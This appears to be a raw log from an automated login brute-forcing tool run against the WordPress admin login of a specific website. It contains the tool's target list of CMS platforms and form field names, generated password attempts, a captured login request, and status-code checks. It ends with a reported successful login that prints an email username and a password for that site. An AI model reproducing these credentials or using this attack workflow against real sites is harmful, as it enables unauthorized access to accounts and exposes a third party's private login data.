INFO:root:random password generated: e38QZRA.km
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:random password generated: +2Fs<o1Pr|
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:{
  "pass_user": "pass_user.csv",
  "Technologies": [
    "WordPress",
    "CMS Hub",
    "Drupal",
    "Joomla",
    "Shopify",
    "Prestashop",
    "Magento",
    "Webflow",
    "Concrete5",
    "TYPO3",
    "Ghost",
    "Squarespace",
    "Wix",
    "Weebly",
    "Jimdo",
    "IONOS",
    "WebNode",
    "Mozello",
    "Site123",
    "Tumblr",
    "Medium",
    "Blogger"
  ],
  "params_list": {
    "password_param": [
      "password"
    ],
    "user_param": [
      "username",
      "email",
      "log",
      "id"
    ],
    "ButtonList": [
      "login",
      "signin",
      "submit"
    ],
    "loginTexts": [
      "log-in",
      "sign-in",
      "log in",
      "login",
      "sign in"
    ]
  }
}
INFO:root:{
  "headers": {
    "host": "alqlambara.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.5",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://alqlambara.com/wp-login.php",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://alqlambara.com",
    "alt-used": "alqlambara.com",
    "connection": "keep-alive",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1"
  },
  "button_attr": "input[type=submit][name=wp-submit][id=wp-submit][class=button\\ button-primary\\ button-large][value=\u062f\u062e\u0648\u0644]",
  "form": "<form action=\"https://alqlambara.com/wp-login.php\" id=\"loginform\" method=\"post\" name=\"loginform\">\n<p>\n<label for=\"user_login\">\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0623\u0648 \u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a</label>\n<input autocapitalize=\"none\" autocomplete=\"username\" class=\"input\" id=\"user_login\" name=\"log\" size=\"20\" type=\"text\" value=\"\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\">\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631</label>\n<div class=\"wp-pwd\">\n<input autocomplete=\"current-password\" class=\"input password-input\" id=\"user_pass\" name=\"pwd\" size=\"20\" type=\"password\" value=\"\"/>\n<button aria-label=\"\u0639\u0631\u0636 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" type=\"button\">\n<span aria-hidden=\"true\" class=\"dashicons dashicons-visibility\"></span>\n</button>\n</div>\n</div>\n<p class=\"forgetmenot\"><input id=\"rememberme\" name=\"rememberme\" type=\"checkbox\" value=\"forever\"/> <label for=\"rememberme\">\u062a\u0630\u0643\u0631\u0646\u064a</label></p>\n<p class=\"submit\">\n<input class=\"button button-primary button-large\" id=\"wp-submit\" name=\"wp-submit\" type=\"submit\" value=\"\u062f\u062e\u0648\u0644\"/>\n<input name=\"redirect_to\" type=\"hidden\" value=\"https://alqlambara.com/wp-admin/\"/>\n<input name=\"testcookie\" type=\"hidden\" value=\"1\"/>\n</p>\n</form>",
  "user_param": "log",
  "password_param": "pwd",
  "contentLen": 4759.0,
  "post_data": {
    "pwd": "+2Fs<o1Pr|",
    "wp-submit": "\u062f\u062e\u0648\u0644",
    "redirect_to": "https://alqlambara.com/wp-admin/",
    "testcookie": "1"
  },
  "method": "POST",
  "action": "https://alqlambara.com/wp-login.php",
  "status_code": 200,
  "req_body_type": "URL_ENCODED"
}
INFO:root:[main]: headless: True
INFO:root:[check_login] Status code!: 200
INFO:root: max_similarity: 0.9533333333333334
INFO:root:[check_login] Status code!: 200
INFO:root: max_similarity: 0.9533333333333334
INFO:root:[check_login] Status code!: 302
INFO:root:[check_login] Status code changed!: 302
INFO:root:login successfull

username: alqlambara@gmail.com
password: bara12340
